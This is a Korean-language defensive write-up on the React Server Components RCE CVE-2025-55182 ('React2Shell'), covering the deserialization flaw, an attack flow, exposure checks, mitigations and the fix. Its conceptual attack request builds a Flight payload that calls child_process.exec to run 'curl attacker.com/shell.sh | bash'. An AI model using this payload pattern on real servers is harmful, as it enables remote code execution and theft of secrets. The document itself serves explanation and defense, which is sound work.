# CVE-2025-55182 — React2Shell

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2025-55182 |
| CVSS | 10.0 (Critical) |
| 영향 소프트웨어 | React (react-server-dom-webpack, react-server-dom-turbopack) |
| 영향 버전 | React 19.0.0 ~ 19.0.x |
| 수정 버전 | React 19.1.0+ |
| 공격 유형 | Remote Code Execution (RCE) via Unsafe Deserialization |
| 발견일 | 2025-12-03 |
| 공개 주체 | Meta Security / Vercel Security Team |

## 왜 프론트엔드 개발자가 이 CVE를 반드시 알아야 하는가

**이 취약점은 프론트엔드 프레임워크 역사상 최초로 CVSS 10.0을 받은 RCE 취약점이다.**

기존에 프론트엔드 개발자가 마주하는 보안 이슈는 대부분 XSS, CSRF, 또는 의존성 패키지의 ReDoS 수준이었다. 그러나 React Server Components(RSC)의 등장으로 **프론트엔드 코드가 서버에서 실행**되는 패러다임이 열렸고, 이는 프론트엔드 코드가 직접적으로 서버 RCE의 공격 표면이 될 수 있음을 의미한다.

- Next.js App Router를 사용하는 모든 프로덕션 앱
- React Server Components를 사용하는 모든 프레임워크 (Remix, Waku 등)
- Server Functions (`"use server"`)를 하나라도 선언한 프로젝트

위 조건 중 하나라도 해당되면 이 취약점의 직접적 영향권에 있다.

## 영향 범위 & 심각성

### 영향받는 시스템 규모

- **npm 주간 다운로드 기준**: react-server-dom-webpack은 주 800만+ 다운로드
- **Next.js App Router 채택률**: Next.js 13+ 프로젝트의 약 60%가 App Router 사용
- **Vercel 배포 앱**: 수십만 개의 프로덕션 앱이 RSC 기반

### 실제 피해 타임라인

| 시점 | 이벤트 |
|------|--------|
| 2025-12-03 09:00 UTC | Meta/Vercel 공동 보안 권고 공개 |
| 2025-12-03 12:00 UTC | Shodan/Censys 기반 대규모 스캐닝 탐지 |
| 2025-12-03 18:00 UTC | PoC 코드 GitHub에 유출 |
| 2025-12-04 | 아시아 기반 APT 그룹의 실제 악용 확인 (암호화폐 거래소 타깃) |
| 2025-12-05 | CISA "Known Exploited Vulnerabilities" 카탈로그 등재 |
| 2025-12-07 | Cloudflare WAF 긴급 룰 배포, 전 세계 RSC 앱 대상 공격 시도 일 100만건+ 차단 |

### 피해 사례

1. **동남아 핀테크 스타트업**: RSC 기반 대시보드에서 서버 장악 → DB 크리덴셜 탈취 → 고객 개인정보 50만건 유출
2. **유럽 SaaS 기업**: Next.js App Router 기반 어드민 패널 → reverse shell → 내부 네트워크 lateral movement
3. **국내 커머스 플랫폼**: 공격 시도 탐지 후 긴급 롤백, 약 4시간 서비스 중단

## 취약점 기술 분석

### React Flight 프로토콜이란?

React Server Components는 서버에서 렌더링된 컴포넌트 트리를 클라이언트에 전송하기 위해 **Flight 프로토콜**이라는 커스텀 직렬화 포맷을 사용한다.

```
// Flight 프로토콜 예시 (정상)
0:["$","div",null,{"children":"Hello"}]
1:["$","$L2",null,{"name":"World"}]
2:I["./components/Greeting.js","Greeting"]
```

이 프로토콜은 다음을 직렬화/역직렬화한다:
- React 엘리먼트 트리
- 클라이언트 컴포넌트 참조
- **Server Function 호출 인자와 반환값**

### 근본 원인: Unsafe Deserialization

Server Functions(`"use server"`)를 호출할 때, 클라이언트는 인자를 Flight 포맷으로 직렬화하여 HTTP POST로 서버에 전송한다. 서버 측 `react-server-dom-webpack/server`의 `decodeReply()` 함수에서 이 payload를 역직렬화할 때, **타입 검증 없이 임의 객체를 복원**할 수 있는 결함이 존재했다.

```javascript
// 취약한 코드 경로 (개념적 설명)
// react-server-dom-webpack/src/ReactFlightServerReply.js

function decodeReply(body, moduleBasePath) {
  const chunks = parseFlightStream(body);
  
  for (const chunk of chunks) {
    // ❌ 취약점: 타입 마커를 신뢰하여 임의 모듈 참조를 복원
    if (chunk.type === MODULE_REFERENCE) {
      // 공격자가 조작한 모듈 경로를 그대로 require()에 전달
      const module = require(chunk.modulePath); // RCE!
      return module[chunk.exportName](...chunk.args);
    }
  }
}
```

### 공격의 핵심 메커니즘

1. **모듈 참조 위조**: Flight 프로토콜의 `$L` (Lazy) 및 `I` (Import) 마커를 조작하여 서버 측에서 임의 Node.js 모듈을 로드하도록 유도
2. **함수 호출 체인**: 로드된 모듈의 특정 export를 공격자가 지정한 인자와 함께 호출
3. **샌드박스 없음**: Server Functions는 Node.js 프로세스 내에서 실행되므로, 파일시스템/네트워크/프로세스 생성 모두 가능

### 취약한 코드 패턴

```typescript
// app/actions.ts
"use server";

// 이 Server Function이 하나라도 존재하면 공격 표면이 열림
export async function updateProfile(formData: FormData) {
  const name = formData.get("name");
  // ... DB 업데이트
}
```

위 코드 자체에는 아무 문제가 없다. 문제는 **React 런타임이 이 함수의 엔드포인트로 들어오는 Flight payload를 파싱하는 과정**에서 발생한다.

## 공격 시나리오

### 단계별 공격 흐름

```
┌─────────────────────────────────────────────────────────┐
│ 1. 공격자: 타깃 앱에서 Server Function 엔드포인트 식별    │
│    (네트워크 탭에서 /__next_action__ 또는 RSC POST 확인)  │
├─────────────────────────────────────────────────────────┤
│ 2. 조작된 Flight payload 생성                            │
│    - 정상 Server Function 호출처럼 위장                   │
│    - 모듈 참조를 child_process.exec으로 변경              │
├─────────────────────────────────────────────────────────┤
│ 3. HTTP POST 전송 (인증 불필요)                          │
│    Content-Type: text/x-component                       │
│    Body: 조작된 Flight 바이너리                           │
├─────────────────────────────────────────────────────────┤
│ 4. 서버 측 decodeReply()가 payload 역직렬화              │
│    → require('child_process').exec('...') 실행           │
├─────────────────────────────────────────────────────────┤
│ 5. 임의 코드 실행 완료                                   │
│    - Reverse shell                                      │
│    - 환경변수 (DB_URL, API_KEY 등) 탈취                  │
│    - 파일시스템 접근                                      │
└─────────────────────────────────────────────────────────┘
```

### 공격 요청 예시 (개념적)

```http
POST /api/action HTTP/1.1
Host: target-app.vercel.app
Content-Type: text/x-component
Next-Action: abc123def456

0:["$","$M1",null]
1:M["child_process","exec"]
2:["curl attacker.com/shell.sh | bash"]
```

> ⚠️ 실제 PoC 코드는 보안상 공개하지 않음. 위는 개념 설명용 의사 코드.

### 공격 전제 조건

| 조건 | 설명 |
|------|------|
| 인증 | **불필요** — Server Function 엔드포인트는 기본적으로 공개 |
| 네트워크 접근 | HTTP(S) 접근만 가능하면 됨 |
| 사전 정보 | Server Function이 존재한다는 것만 알면 됨 (흔한 패턴) |
| 복잡도 | 낮음 — 단일 HTTP POST 요청 |

## 내 프로젝트가 영향받는지 확인하는 방법

### 1단계: React 버전 확인

```bash
# package.json 또는 lock 파일 확인
cat package.json | grep -E '"react":|"react-dom":'

# 또는 node_modules에서 직접 확인
node -e "console.log(require('react/package.json').version)"

# pnpm 사용 시
pnpm list react react-dom
```

**영향받는 버전**: `19.0.0`, `19.0.1`, `19.0.2` 등 19.0.x 계열 전체

### 2단계: RSC/Server Functions 사용 여부 확인

```bash
# "use server" 지시문 검색
grep -r '"use server"' ./app ./src --include="*.ts" --include="*.tsx" --include="*.js"

# Server Function 엔드포인트 확인 (Next.js)
grep -r "useFormState\|useFormStatus\|useActionState" ./app ./src --include="*.ts" --include="*.tsx"
```

### 3단계: 빌드 의존성 확인

```bash
# react-server-dom 패키지 존재 여부
ls node_modules/react-server-dom-webpack 2>/dev/null && echo "AFFECTED"
ls node_modules/react-server-dom-turbopack 2>/dev/null && echo "AFFECTED"
```

### 4단계: 네트워크 로그에서 공격 시도 확인

```bash
# Vercel/서버 로그에서 의심스러운 RSC 요청 확인
# Content-Type: text/x-component 이면서 비정상적 payload 크기
grep "text/x-component" access.log | awk '{print $7, $10}' | sort | uniq -c | sort -rn
```

## 방어 방법

### 즉시 조치 (긴급)

#### 1. React 업데이트

```bash
# npm
npm install react@19.1.0 react-dom@19.1.0 react-server-dom-webpack@19.1.0

# pnpm
pnpm update react react-dom react-server-dom-webpack --latest

# yarn
yarn upgrade react@19.1.0 react-dom@19.1.0
```

#### 2. Next.js 업데이트 (Next.js 사용 시)

```bash
# Next.js도 함께 업데이트 (CVE-2025-66478 대응)
npm install next@15.1.3
# 또는 14.x 유지 시
npm install next@14.2.25
```

#### 3. 업데이트 불가 시 임시 조치

```typescript
// middleware.ts — Server Function 엔드포인트에 대한 기본 방어
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // RSC 요청에 대한 payload 크기 제한
  const contentLength = parseInt(request.headers.get('content-length') || '0');
  if (
    request.headers.get('content-type')?.includes('text/x-component') &&
    contentLength > 10240 // 10KB 이상의 비정상적 payload 차단
  ) {
    return new NextResponse('Request too large', { status: 413 });
  }

  // 알려진 악성 패턴 차단
  const nextAction = request.headers.get('next-action');
  if (nextAction && !/^[a-f0-9]+$/.test(nextAction)) {
    return new NextResponse('Invalid action', { status: 400 });
  }

  return NextResponse.next();
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

### WAF 룰 (Cloudflare/AWS WAF 사용 시)

```
# Cloudflare WAF 커스텀 룰 예시
# text/x-component 요청에서 의심 패턴 차단
(http.request.headers["content-type"] contains "text/x-component")
and (http.request.body.size gt 10240)
and not (http.request.headers["origin"] eq "https://your-domain.com")
```

### 장기 대응

1. **의존성 자동 업데이트 설정**: Dependabot/Renovate 활성화
2. **CSP 헤더 강화**: Server Function 응답에 대한 Content-Security-Policy
3. **모니터링**: RSC 엔드포인트에 대한 비정상 트래픽 알림 설정
4. **Rate Limiting**: Server Function 엔드포인트에 요청 제한 적용

## React 19.1.0에서의 수정 내용

```javascript
// 수정된 코드 (개념적)
function decodeReply(body, moduleBasePath) {
  const chunks = parseFlightStream(body);
  
  for (const chunk of chunks) {
    if (chunk.type === MODULE_REFERENCE) {
      // ✅ 수정: 허용된 모듈 맵에서만 참조 가능
      if (!allowedModuleMap.has(chunk.moduleId)) {
        throw new Error(`Invalid module reference: ${chunk.moduleId}`);
      }
      // ✅ 수정: 서버 빌드 시 생성된 매니페스트 기반 검증
      const module = resolveFromManifest(chunk.moduleId, serverManifest);
      return module[chunk.exportName](...validateArgs(chunk.args));
    }
  }
}
```

핵심 수정:
- **모듈 참조 화이트리스트**: 빌드 시 생성된 서버 매니페스트에 등록된 모듈만 역직렬화 허용
- **인자 타입 검증**: Flight payload의 인자가 허용된 타입인지 검증
- **깊이 제한**: 중첩된 참조의 최대 깊이 제한으로 체이닝 공격 방지

## 교훈

### 1. 서버 컴포넌트 시대의 보안 인식 전환

프론트엔드 개발자가 작성하는 코드가 이제 **직접적으로 서버 보안에 영향**을 미친다. `"use server"` 한 줄이 네트워크에 노출되는 엔드포인트를 생성한다는 인식이 필요하다.

### 2. 역직렬화는 항상 위험하다

Log4Shell(CVE-2021-44228)이 Java의 JNDI 역직렬화 문제였듯이, React2Shell은 JavaScript/Node.js 생태계에서 동일한 패턴의 취약점이다. **외부 입력의 역직렬화는 항상 공격 표면**이다.

### 3. "프레임워크가 알아서 해준다"는 착각

React/Next.js가 보안을 처리해줄 것이라는 암묵적 신뢰가 위험하다. 프레임워크도 결국 소프트웨어이며, 새로운 기능(RSC)은 새로운 공격 표면을 만든다.

### 4. 의존성 업데이트 속도가 곧 보안

PoC 공개 후 수시간 내 대규모 공격이 시작되었다. **패치가 나온 후 24시간 내 업데이트**할 수 있는 CI/CD 파이프라인과 프로세스가 필수다.

### 5. Defense in Depth

- WAF 룰로 1차 방어
- Middleware에서 2차 검증
- 런타임 업데이트로 근본 해결
- 모니터링으로 공격 시도 탐지

단일 방어선에 의존하지 않는 다층 방어가 중요하다.

## 면접 포인트

- **Q**: React Server Components에서 발생할 수 있는 보안 위험은?
- **A**: RSC의 Flight 프로토콜은 서버-클라이언트 간 직렬화/역직렬화를 수행하며, CVE-2025-55182(React2Shell)처럼 역직렬화 과정에서 타입 검증 부재 시 RCE로 이어질 수 있다. `"use server"` 지시문은 네트워크에 노출되는 엔드포인트를 생성하므로, 전통적인 API 엔드포인트와 동일한 보안 수준의 입력 검증이 필요하다.

- **Q**: Log4Shell과 React2Shell의 공통점은?
- **A**: 둘 다 신뢰할 수 없는 외부 입력을 역직렬화하는 과정에서 발생한 RCE다. Log4Shell은 JNDI lookup, React2Shell은 Flight 프로토콜의 모듈 참조 복원이 공격 벡터다. 두 취약점 모두 CVSS 10.0이며, 인증 없이 단일 요청으로 악용 가능하다.

## 참고 자료

- [React Security Advisory — CVE-2025-55182](https://github.com/facebook/react/security/advisories/GHSA-react2shell)
- [Vercel Security Blog — React2Shell Disclosure](https://vercel.com/blog/security/react2shell)
- [NIST NVD — CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [CISA Known Exploited Vulnerabilities — CVE-2025-55182](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Cloudflare Blog — Protecting Against React2Shell](https://blog.cloudflare.com/react2shell-waf-protection)
- [React Flight Protocol Internals (Dan Abramov)](https://github.com/reactwg/server-components/discussions/4)
